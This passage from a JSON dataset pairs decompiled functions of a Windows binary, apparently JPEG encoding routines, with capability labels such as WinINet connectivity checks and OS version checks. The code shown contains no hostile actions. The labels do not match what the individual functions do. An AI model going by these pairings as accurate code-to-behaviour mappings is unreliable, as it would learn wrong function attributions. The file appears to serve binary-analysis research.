(**(unaff_ESI[0x5d] + 8))();\n        cVar2 = *(unaff_ESI[0x5d] + 0xd);\n    }\n    (**(unaff_ESI[0x61] + 0xc))();\n    (**(unaff_ESI[6] + 0x10))();\n    if (unaff_ESI[1] != 0) {\n        (**(unaff_ESI[1] + 0x24))();\n        if (*(unaff_ESI + 4) != '\\0') {\n            unaff_ESI[5] = 200;\n            unaff_ESI[0x43] = 0;\n            return;\n        }\n        unaff_ESI[5] = 100;\n    }\n    return;\n}\n",
        "token_count": 651
    },
    "0040e6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e6c0(void)\n\n{\n    int32_t *unaff_ESI;\n    \n    if (unaff_ESI[5] != 0x65) {\n        *(*unaff_ESI + 0x14) = 0x15;\n        *(*unaff_ESI + 0x18) = unaff_ESI[5];\n        (***unaff_ESI)();\n    }\n    if (unaff_ESI[8] <= unaff_ESI[0x3d]) {\n        *(*unaff_ESI + 0x14) = 0x7e;\n        (**(*unaff_ESI + 4))();\n    }\n    if (unaff_ESI[2] != 0) {\n        *(unaff_ESI[2] + 4) = unaff_ESI[0x3d];\n        *(unaff_ESI[2] + 8) = unaff_ESI[8];\n        (**unaff_ESI[2])();\n    }\n    if (*(unaff_ESI[0x5d] + 0xc) != '\\0') {\n        (**(unaff_ESI[0x5d] + 4))();\n    }\n    (**(unaff_ESI[0x5e] + 4))();\n    unaff_ESI[0x3d] = unaff_ESI[0x3d];\n    return;\n}\n",
        "token_count": 304
    },
    "0040ed40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040ed40(int32_t *param_1, int32_t param_2, char param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    \n    if (param_3 == '\\0') {\n        iVar7 = param_1[param_2 + 0x1e];\n    }\n    else {\n        iVar7 = param_1[param_2 + 0x22];\n        param_2 = param_2 + 0x10;\n    }\n    if (iVar7 == 0) {\n        *(*param_1 + 0x14) = 0x34;\n        *(*param_1 + 0x18) = param_2;\n        (***param_1)(param_1);\n    }\n    if (*(iVar7 + 0x111) == '\\0') {\n        fcn.0040ea30(0xc4);\n        iVar8 = 0;\n        iVar9 = 0;\n        iVar6 = 0;\n        iVar5 = 0;\n        puVar4 = iVar7 + 2;\n        _param_3 = 4;\n        do {\n            iVar8 = iVar8 + puVar4[-1];\n            iVar5 = iVar5 + *puVar4;\n            iVar6 = iVar6 + puVar4[1];\n            iVar9 = iVar9 + puVar4[2];\n            puVar4 = puVar4 + 4;\n            _param_3 = _param_3 + -1;\n        } while (_param_3 != 0);\n        piVar2 = param_1[6];\n        iVar8 = iVar8 + iVar9 + iVar6 + iVar5;\n        **piVar2 = iVar8 + 0x13 >> 8;\n        *piVar2 = *piVar2 + 1;\n        piVar1 = piVar2 + 1;\n        *piVar1 = *piVar1 + -1;\n        if ((*piVar1 == 0) && (cVar3 = (*piVar2[3])(param_1),  cVar3 == '\\0')) {\n            *(*param_1 + 0x14) = 0x19;\n            (***param_1)(param_1);\n        }\n        piVar2 = param_1[6];\n        **piVar2 = iVar8 + 0x13;\n        *piVar2 = *piVar2 + 1;\n        piVar1 = piVar2 + 1;\n        *piVar1 = *piVar1 + -1;\n        if ((*piVar1 == 0) && (cVar3 = (*piVar2[3])(param_1),  cVar3 == '\\0')) {\n            *(*param_1 + 0x14) = 0x19;\n            (***param_1)(param_1);\n        }\n        piVar2 = param_1[6];\n        **piVar2 = param_2;\n        *piVar2 = *piVar2 + 1;\n        piVar1 = piVar2 + 1;\n        *piVar1 = *piVar1 + -1;\n        if ((*piVar1 == 0) && (cVar3 = (*piVar2[3])(param_1),  cVar3 == '\\0')) {\n            *(*param_1 + 0x14) = 0x19;\n            (***param_1)(param_1);\n        }\n        iVar5 = 1;\n        do {\n            piVar2 = param_1[6];\n            **piVar2 = *(iVar5 + iVar7);\n            *piVar2 = *piVar2 + 1;\n            piVar1 = piVar2 + 1;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (cVar3 = (*piVar2[3])(param_1),  cVar3 == '\\0')) {\n                *(*param_1 + 0x14) = 0x19;\n                (***param_1)(param_1);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x11);\n        iVar5 = 0;\n        if (0 < iVar8) {\n            do {\n                piVar2 = param_1[6];\n                **piVar2 = *(iVar7 + 0x11 + iVar5);\n                *piVar2 = *piVar2 + 1;\n                piVar1 = piVar2 + 1;\n                *piVar1 = *piVar1 + -1;\n                if ((*piVar1 == 0) && (cVar3 = (*piVar2[3])(param_1),  cVar3 == '\\0')) {\n                    *(*param_1 + 0x14) = 0x19;\n                    (***param_1)(param_1);\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < iVar8);\n        }\n        *(iVar7 + 0x111) = 1;\n    }\n    return;\n}\n",
        "token_count": 1157
    },
    "00410e10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00410e10(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                 uint param_8, uint param_9, uint param_10, uint param_11, uint param_12, uint param_13, uint param_14, \n                 uint param_15, uint param_16, uint param_17, uint param_18, uint param_19, uint param_20, uint param_21\n                 , uint param_22, uint param_23, uint param_24, uint param_25, uint param_26, uint param_27, \n                 uint param_28, uint param_29, uint param_30, uint param_31, uint param_32, uint param_33, uint param_34\n                 , uint param_35, uint param_36, uint param_37, uint param_38, uint param_39, uint param_40, \n                 uint param_41, uint param_42, uint param_43, uint param_44, uint param_45, uint param_46, uint param_47\n                 , uint param_48, uint param_49, uint param_50, uint param_51, uint param_52, uint param_53, \n                 uint param_54, uint param_55, uint param_56, uint param_57, uint param_58, uint param_59, uint param_60\n                 , uint param_61, uint param_62, uint param_63, uint param_64, uint param_65, uint param_66, \n                 uint param_67, uint param_68, uint param_69, uint param_70, uint param_71, uint param_72, uint param_73\n                 , uint param_74, uint param_75, uint param_76, uint param_77, uint param_78, uint param_79, \n                 uint param_80, uint param_81, uint param_82, uint param_83, uint param_84, uint param_85, uint param_86\n                 , uint param_87, uint param_88, uint param_89, uint param_90, uint param_91)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    fcn.00413e50();\n    if (*(in_EAX + 0xd0) == '\\0') {\n        fcn.00411470();\n        fcn.00415f30();\n        fcn.00414d30();\n    }\n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 400) = puVar1;\n    *puVar1 = 0x415080;\n    puVar1[0x15] = 0;\n    puVar1[0x23] = 0;\n    puVar1[0x16] = 0;\n    puVar1[0x24] = 0;\n    puVar1[0x17] = 0;\n    puVar1[0x25] = 0;\n    puVar1[0x18] = 0;\n    puVar1[0x26] = 0;\n    if (*(in_EAX + 0xd1) == '\\0') {\n        uVar2 = fcn.00417c40();\n    }\n    else {\n        uVar2 = fcn.00412a10();\n    }\n    if ((*(in_EAX + 200) < 2) && (*(in_EAX + 0xd2) == '\\0')) {\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    else {\n        uVar2 = 1;\n    }\n    fcn.004146a0(in_EAX, uVar2, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_1, param_2, param_3, param_4, \n                 param_5, param_6, param_7, param_8, param_9, param_10, param_11, param_12, param_13, param_14, param_15\n                 , param_16, param_17, param_18, param_19, param_20, param_21, param_22, param_23, param_24, param_25, \n                 param_26, param_27, param_28, param_29, param_30, param_31, param_32, param_33, param_34, param_35, \n                 param_36, param_37, param_38, param_39, param_40, param_41, param_42, param_43, param_44, param_45, \n                 param_46, param_47, param_48, param_49, param_50, param_51, param_52, param_53, param_54, param_55, \n                 param_56, param_57, param_58, param_59, param_60, param_61, param_62, param_63, param_64, param_65, \n                 param_66, param_67, param_68, param_69, param_70, param_71, param_72, param_73, param_74, param_75, \n                 param_76, param_77, param_78, param_79, param_80, param_81, param_82, param_83, param_84, param_85, \n                 param_86, param_87, param_88, param_89, param_90, param_91);\n    fcn.00412b60();\n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x184) = puVar1;\n    *puVar1 = 0x40fd40;\n    puVar1[1] = 0x40fde0;\n    puVar1[2] = 0x40fef0;\n    puVar1[3] = 0x40ffa0;\n    puVar1[4] = 0x410010;\n    puVar1[5] = 0x40fcc0;\n    puVar1[6] = 0x40fd00;\n    puVar1[7] = 0;\n    (**(*(in_EAX + 4) + 0x18))();\n    (***(in_EAX + 0x184))();\n    return;\n}\n",
        "token_count": 1458
    },
    "00411470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00411470(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *unaff_ESI;\n    \n    puVar2 = (**unaff_ESI[1])();\n    unaff_ESI[0x62] = puVar2;\n    *puVar2 = 0x4156c0;\n    // switch table (10 cases) at 0x411654\n    switch(unaff_ESI[10]) {\n    case 1:\n        if (unaff_ESI[9] != 1) {\ncode_r0x004114c0:\n            *(*unaff_ESI + 0x14) = 10;\n            (***unaff_ESI)();\n        }\n        break;\n    case 2:\n    case 3:\n        if (unaff_ESI[9] != 3) goto code_r0x004114c0;\n        break;\n    case 4:\n    case 5:\n        if (unaff_ESI[9] != 4) goto code_r0x004114c0;\n        break;\n    default:\n        if (unaff_ESI[9] < 1) goto code_r0x004114c0;\n    }\n    // switch table (5 cases) at 0x411668\n    switch(unaff_ESI[0x14]) {\n    case 1:\n        if (unaff_ESI[0x13] != 1) {\n            *(*unaff_ESI + 0x14) = 0xb;\n            (***unaff_ESI)();\n        }\n        iVar1 = unaff_ESI[10];\n        if ((iVar1 == 1) || (iVar1 == 3)) {\n            puVar2[1] = 0x411310;\n            return;\n        }\n        if (iVar1 == 2) {\n            *puVar2 = 0x410f20;\n            puVar2[1] = 0x411110;\n            return;\n        }\n        break;\n    case 2:\n        if (unaff_ESI[0x13] != 3) {\n            *(*unaff_ESI + 0x14) = 0xb;\n            (***unaff_ESI)();\n        }\n        if (unaff_ESI[10] == 2) {\n            puVar2[1] = 0x411370;\n            return;\n        }\n        break;\n    case 3:\n        if (unaff_ESI[0x13] != 3) {\n            *(*unaff_ESI + 0x14) = 0xb;\n            (***unaff_ESI)();\n        }\n        if (unaff_ESI[10] == 2) {\n            *puVar2 = 0x410f20;\n            puVar2[1] = 0x411000;\n            return;\n        }\n        if (unaff_ESI[10] == 3) goto code_r0x00411647;\n        break;\n    case 4:\n        if (unaff_ESI[0x13] != 4) {\n            *(*unaff_ESI + 0x14) = 0xb;\n            (***unaff_ESI)();\n        }\n        if (unaff_ESI[10] != 4) {\n            *(*unaff_ESI + 0x14) = 0x1c;\n            (***unaff_ESI)();\n            return;\n        }\n        goto code_r0x00411647;\n    case 5:\n        if (unaff_ESI[0x13] != 4) {\n            *(*unaff_ESI + 0x14) = 0xb;\n            (***unaff_ESI)();\n        }\n        if (unaff_ESI[10] == 4) {\n            *puVar2 = 0x410f20;\n            puVar2[1] = 0x4111c0;\n            return;\n        }\n        if (unaff_ESI[10] != 5) {\n            *(*unaff_ESI + 0x14) = 0x1c;\n            (***unaff_ESI)();\n            return;\n        }\n        goto code_r0x00411647;\n    default:\n        if ((unaff_ESI[0x14] != unaff_ESI[10]) || (unaff_ESI[0x13] != unaff_ESI[9])) {\n            *(*unaff_ESI + 0x14) = 0x1c;\n            (***unaff_ESI)();\n        }\ncode_r0x00411647:\n        puVar2[1] = 0x4113f0;\n        return;\n    }\n    *(*unaff_ESI + 0x14) = 0x1c;\n    (***unaff_ESI)();\n    return;\n}\n",
        "token_count": 1035
    },
    "00412b60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00412b60(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    \n    puVar1 = (***(unaff_EDI + 4))();\n    *(unaff_EDI + 0x178) = puVar1;\n    *puVar1 = 0x412a60;\n    if ((*(unaff_EDI + 0xd0) == '\\0') && (iVar3 = 0,  0 < *(unaff_EDI + 0x4c))) {\n        puVar1 = puVar1 + 6;\n        do {\n            uVar2 = (**(*(unaff_EDI + 4) + 8))();\n            *puVar1 = uVar2;\n            iVar3 = iVar3 + 1;\n            puVar1 = puVar1 + 1;\n        } while (iVar3 < *(unaff_EDI + 0x4c));\n    }\n    return;\n}\n",
        "token_count": 223
    },
    "00413120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00413120(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iStack4;\n    \n    fcn.00412bd0();\n    if ((in_EAX[0x5a] < 1) || (0x10 < in_EAX[0x5a])) {\n        *(*in_EAX + 0x14) = 7;\n        *(*in_EAX + 0x18) = in_EAX[0x5a];\n        *(*in_EAX + 0x1c) = in_EAX[0x5a];\n        (***in_EAX)();\n    }\n    iVar2 = in_EAX[0x5a];\n    // switch table (6 cases) at 0x4134b4\n    switch(iVar2) {\n    case 2:\n        in_EAX[0x5b] = 0x43d140;\n        break;\n    case 3:\n        in_EAX[0x5b] = 0x43d0d8;\n        break;\n    case 4:\n        in_EAX[0x5b] = 0x43d058;\n        break;\n    case 5:\n        in_EAX[0x5b] = 0x43cfb0;\n        break;\n    case 6:\n        in_EAX[0x5b] = 0x43cee0;\n        break;\n    case 7:\n        in_EAX[0x5b] = 0x43cdc8;\n        break;\n    default:\n        in_EAX[0x5b] = 0x43cc88;\n    }\n    if (iVar2 < 8) {\n        iVar2 = iVar2 * iVar2 + -1;\n    }\n    else {\n        iVar2 = 0x3f;\n    }\n    in_EAX[0x5c] = iVar2;\n    if ((((in_EAX[0x11] == 0) || (in_EAX[0x10] == 0)) || (in_EAX[0x13] < 1)) || (in_EAX[9] < 1)) {\n        *(*in_EAX + 0x14) = 0x21;\n        (***in_EAX)();\n    }\n    if ((0xffdc < in_EAX[0x11]) || (0xffdc < in_EAX[0x10])) {\n        *(*in_EAX + 0x14) = 0x2a;\n        *(*in_EAX + 0x18) = 0xffdc;\n        (***in_EAX)();\n    }\n    if (in_EAX[0x12] != 8) {\n        *(*in_EAX + 0x14) = 0x10;\n        *(*in_EAX + 0x18) = in_EAX[0x12];\n        (***in_EAX)();\n    }\n    if (10 < in_EAX[0x13]) {\n        *(*in_EAX + 0x14) = 0x1b;\n        *(*in_EAX + 0x18) = in_EAX[0x13];\n        *(*in_EAX + 0x1c) = 10;\n        (***in_EAX)();\n    }\n    iVar2 = 0;\n    in_EAX[0x3f] = 1;\n    in_EAX[0x40] = 1;\n    if (0 < in_EAX[0x13]) {\n        piVar4 = in_EAX[0x15] + 0xc;\n        do {\n            if (((piVar4[-1] < 1) || (4 < piVar4[-1])) || ((*piVar4 < 1 || (4 < *piVar4)))) {\n                *(*in_EAX + 0x14) = 0x13;\n                (***in_EAX)();\n            }\n            iVar3 = in_EAX[0x3f];\n            if (in_EAX[0x3f] <= piVar4[-1]) {\n                iVar3 = piVar4[-1];\n            }\n            in_EAX[0x3f] = iVar3;\n            iVar3 = in_EAX[0x40];\n            if (in_EAX[0x40] <= *piVar4) {\n                iVar3 = *piVar4;\n            }\n            iVar2 = iVar2 + 1;\n            in_EAX[0x40] = iVar3;\n            piVar4 = piVar4 + 0x16;\n        } while (iVar2 < in_EAX[0x13]);\n    }\n    iStack4 = 0;\n    if (0 < in_EAX[0x13]) {\n        piVar4 = in_EAX[0x15] + 0x24;\n        do {\n            piVar4[-8] = iStack4;\n            iVar2 = 1;\n            if (in_EAX[0x41] <= (*(in_EAX + 0x35) != '\\0') * 4 + 4) {\n                do {\n                    if (in_EAX[0x3f] % (piVar4[-7] * iVar2 * 2) != 0) break;\n                    iVar2 = iVar2 * 2;\n                    iVar3 = (*(in_EAX + 0x35) != '\\0') * 4 + 4;\n                } while (in_EAX[0x41] * iVar2 - iVar3 == 0 || in_EAX[0x41] * iVar2 < iVar3);\n            }\n            *piVar4 = in_EAX[0x41] * iVar2;\n            iVar2 = 1;\n            if (in_EAX[0x42] <= (*(in_EAX + 0x35) != '\\0') * 4 + 4) {\n                do {\n                    if (in_EAX[0x40] % (piVar4[-6] * iVar2 * 2) != 0) break;\n                    iVar2 = iVar2 * 2;\n                    iVar3 = (*(in_EAX + 0x35) != '\\0') * 4 + 4;\n                } while (in_EAX[0x42] * iVar2 - iVar3 == 0 || in_EAX[0x42] * iVar2 < iVar3);\n            }\n            iVar3 = *piVar4;\n            iVar2 = in_EAX[0x42] * iVar2;\n            iVar1 = iVar2 * 2;\n            piVar4[1] = iVar2;\n            if (iVar3 == iVar1 || SBORROW4(iVar3, iVar1) != iVar3 + iVar2 * -2 < 0) {\n                iVar1 = iVar2 + iVar3 * -2;\n                if (iVar1 != 0 && SBORROW4(iVar2, iVar3 * 2) == iVar1 < 0) {\n                    piVar4[1] = iVar3 * 2;\n                }\n            }\n            else {\n                *piVar4 = iVar1;\n            }\n            piVar4[-2] = (in_EAX[0x10] * piVar4[-7] + -1 + in_EAX[0x5a] * in_EAX[0x3f]) / (in_EAX[0x5a] * in_EAX[0x3f]);\n            piVar4[-1] = (in_EAX[0x11] * piVar4[-6] + -1 + in_EAX[0x5a] * in_EAX[0x40]) / (in_EAX[0x5a] * in_EAX[0x40]);\n            piVar4[2] = (*piVar4 * piVar4[-7] * in_EAX[0x10] + -1 + in_EAX[0x5a] * in_EAX[0x3f]) /\n                        (in_EAX[0x5a] * in_EAX[0x3f]);\n            iVar2 = in_EAX[0x11];\n            iVar3 = in_EAX[0x5a];\n            iVar1 = in_EAX[0x40];\n            *(piVar4 + 4) = 1;\n            piVar4[3] = (piVar4[1] * piVar4[-6] * iVar2 + -1 + iVar3 * iVar1) / (iVar3 * iVar1);\n            iStack4 = iStack4 + 1;\n            piVar4 = piVar4 + 0x16;\n        } while (iStack4 < in_EAX[0x13]);\n    }\n    in_EAX[0x43] = (in_EAX[0x5a] * in_EAX[0x40] + -1 + in_EAX[0x11]) / (in_EAX[0x5a] * in_EAX[0x40]);\n    return;\n}\n",
        "token_count": 1965
    },
    "004134d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004134d0(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    int32_t *unaff_ESI;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iStack2604;\n    uint32_t auStack2584 [640];\n    char acStack24 [12];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ &stack0xfffff5c8;\n    if (unaff_ESI[0x32] < 1) {\n        *(*unaff_ESI + 0x14) = 0x14;\n        *(*unaff_ESI + 0x18) = 0;\n        (***unaff_ESI)();\n    }\n    piVar6 = unaff_ESI[0x33];\n    if ((piVar6[5] == 0) && (piVar6[6] == 0x3f)) {\n        *(unaff_ESI + 0x3e) = 0;\n        if (0 < unaff_ESI[0x13]) {\n            fcn.00429890(acStack24, 0, unaff_ESI[0x13]);\n        }\n    }\n    else {\n        *(unaff_ESI + 0x3e) = 1;\n        if (0 < unaff_ESI[0x13]) {\n            puVar8 = auStack2584;\n            for (iVar10 = (unaff_ESI[0x13] & 0xffffffU) << 6; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar8 = 0xffffffff;\n                puVar8 = puVar8 + 1;\n            }\n        }\n    }\n    iVar10 = 1;\n    if (0 < unaff_ESI[0x32]) {\n        do {\n            iStack2604 = *piVar6;\n            if ((iStack2604 < 1) || (4 < iStack2604)) {\n                *(*unaff_ESI + 0x14) = 0x1b;\n                *(*unaff_ESI + 0x18) = iStack2604;\n                *(*unaff_ESI + 0x1c) = 4;\n                (***unaff_ESI)();\n            }\n            iVar9 = 0;\n            if (0 < iStack2604) {\n                do {\n                    iVar1 = piVar6[iVar9 + 1];\n                    if ((iVar1 < 0) || (unaff_ESI[0x13] <= iVar1)) {\n                        *(*unaff_ESI + 0x14) = 0x14;\n                        *(*unaff_ESI + 0x18) = iVar10;\n                        (***unaff_ESI)();\n                    }\n                    if ((0 < iVar9) && (iVar1 <= piVar6[iVar9])) {\n                        *(*unaff_ESI + 0x14) = 0x14;\n                        *(*unaff_ESI + 0x18) = iVar10;\n                        (***unaff_ESI)();\n                    }\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < iStack2604);\n            }\n            uVar2 = piVar6[5];\n            iVar9 = piVar6[6];\n            uVar3 = piVar6[7];\n            uVar4 = piVar6[8];\n            if (*(unaff_ESI + 0x3e) == '\\0') {\n                if ((((uVar2 != 0) || (iVar9 != 0x3f)) || (uVar3 != 0)) || (uVar4 != 0)) {\n                    *(*unaff_ESI + 0x14) = 0x12;\n                    *(*unaff_ESI + 0x18) = iVar10;\n                    (***unaff_ESI)();\n                }\n                piVar7 = piVar6;\n                if (0 < iStack2604) {\n                    do {\n                        iVar9 = piVar7[1];\n                        if (acStack24[iVar9] != '\\0') {\n                            *(*unaff_ESI + 0x14) = 0x14;\n                            *(*unaff_ESI + 0x18) = iVar10;\n                            (***unaff_ESI)();\n                        }\n                        iStack2604 = iStack2604 + -1;\n                        acStack24[iVar9] = '\\x01';\n                        piVar7 = piVar7 + 1;\n                    } while (iStack2604 != 0);\n                }\n            }\n            else {\n                if ((((0x3f < uVar2) || (iVar9 < uVar2)) || ((0x3f < iVar9 || ((10 < uVar3 || (uVar4 < 0)))))) ||\n                   (10 < uVar4)) {\n                    *(*unaff_ESI + 0x14) = 0x12;\n                    *(*unaff_ESI + 0x18) = iVar10;\n                    (***unaff_ESI)();\n                }\n                if (uVar2 == 0) {\n                    if (iVar9 != 0) {\n                        *(*unaff_ESI + 0x14) = 0x12;\n                        *(*unaff_ESI + 0x18) = iVar10;\n                        (***unaff_ESI)();\n                    }\n                }\n                else if (iStack2604 != 1) {\n                    *(*unaff_ESI + 0x14) = 0x12;\n                    *(*unaff_ESI + 0x18) = iVar10;\n                    (***unaff_ESI)();\n                }\n                piVar7 = piVar6;\n                if (0 < iStack2604) {\n                    do {\n                        piVar7 = piVar7 + 1;\n                        puVar8 = auStack2584 + *piVar7 * 0x40;\n                        uVar5 = uVar2;\n                        if ((uVar2 != 0) && (*puVar8 < 0)) {\n                            *(*unaff_ESI + 0x14) = 0x12;\n                            *(*unaff_ESI + 0x18) = iVar10;\n                            (***unaff_ESI)();\n                        }\n                        for (; uVar5 <= iVar9; uVar5 = uVar5 + 1) {\n                            if (puVar8[uVar5] < 0) {\n                                if (uVar3 != 0) {\n                                    *(*unaff_ESI + 0x14) = 0x12;\n                                    *(*unaff_ESI + 0x18) = iVar10;\n                                    (***unaff_ESI)();\n                                }\n                            }\n                            else if ((uVar3 != puVar8[uVar5]) || (uVar4 != uVar3 - 1)) {\n                                *(*unaff_ESI + 0x14) = 0x12;\n                                *(*unaff_ESI + 0x18) = iVar10;\n                                (***unaff_ESI)();\n                            }\n                            puVar8[uVar5] = uVar4;\n                        }\n                        iStack2604 = iStack2604 + -1;\n                    } while (iStack2604 != 0);\n                }\n            }\n            iVar10 = iVar10 + 1;\n            piVar6 = piVar6 + 9;\n        } while (iVar10 <= unaff_ESI[0x32]);\n    }\n    iVar9 = 0;\n    if (*(unaff_ESI + 0x3e) == '\\0') {\n        if (0 < unaff_ESI[0x13]) {\n            do {\n                if (acStack24[iVar9] == '\\0') {\n                    *(*unaff_ESI + 0x14) = 0x2e;\n                    (***unaff_ESI)();\n                }\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < unaff_ESI[0x13]);\n        }\n    }\n    else if (0 < unaff_ESI[0x13]) {\n        puVar8 = auStack2584;\n        do {\n            if (*puVar8 < 0) {\n                *(*unaff_ESI + 0x14) = 0x2e;\n                (***unaff_ESI)();\n            }\n            iVar9 = iVar9 + 1;\n            puVar8 = puVar8 + 0x40;\n        } while (iVar9 < unaff_ESI[0x13]);\n        fcn.00420bc6(iVar10);\n        return;\n    }\n    fcn.00420bc6(iVar10);\n    return;\n}\n",
        "token_count": 1907
    },
    "00414c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00414c10(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *arg_ch;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t unaff_ESI;\n    int32_t iStack24;\n    int32_t iStack16;\n    int32_t *piStack12;\n    \n    iVar5 = *(unaff_ESI + 0x17c);\n    iVar1 = *(unaff_ESI + 0x100);\n    iVar2 = (***(unaff_ESI + 4))();\n    iStack16 = 0;\n    if (0 < *(unaff_ESI + 0x4c)) {\n        piStack12 = iVar5 + 8;\n        do {\n            arg_ch = (**(*(unaff_ESI + 4) + 8))();\n            fcn.00423e20(iVar2 + iVar1 * 4, arg_ch, iVar1 * 0xc);\n            if (0 < iVar1) {\n                puVar3 = iVar1 * 0x10 + iVar2;\n                puVar4 = arg_ch + iVar1 * 2;\n                iVar5 = iVar2 - arg_ch;\n                iStack24 = iVar1;\n                do {\n                    *(arg_ch + iVar5) = *puVar4;\n                    *puVar3 = *arg_ch;\n                    puVar4 = puVar4 + 1;\n                    arg_ch = arg_ch + 1;\n                    puVar3 = puVar3 + 1;\n                    iStack24 = iStack24 + -1;\n                } while (iStack24 != 0);\n            }\n            iVar5 = iVar2 + iVar1 * 4;\n            iVar2 = iVar2 + iVar1 * 0x14;\n            *piStack12 = iVar5;\n            iStack16 = iStack16 + 1;\n            piStack12 = piStack12 + 1;\n        } while (iStack16 < *(unaff_ESI + 0x4c));\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "00414d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00414d30(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x17c) = puVar1;\n    *puVar1 = 0x4147c0;\n    if (*(*(in_EAX + 0x18c) + 8) == '\\0') {\n        puVar1[1] = 0x414810;\n        iVar3 = 0;\n        if (0 < *(in_EAX + 0x4c)) {\n            puVar1 = puVar1 + 2;\n            do {\n                uVar2 = (**(*(in_EAX + 4) + 8))();\n                *puVar1 = uVar2;\n                iVar3 = iVar3 + 1;\n                puVar1 = puVar1 + 1;\n            } while (iVar3 < *(in_EAX + 0x4c));\n        }\n        return;\n    }\n    puVar1[1] = 0x414a20;\n    fcn.00414c10();\n    return;\n}\n",
        "token_count": 267
    },
    "00415f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
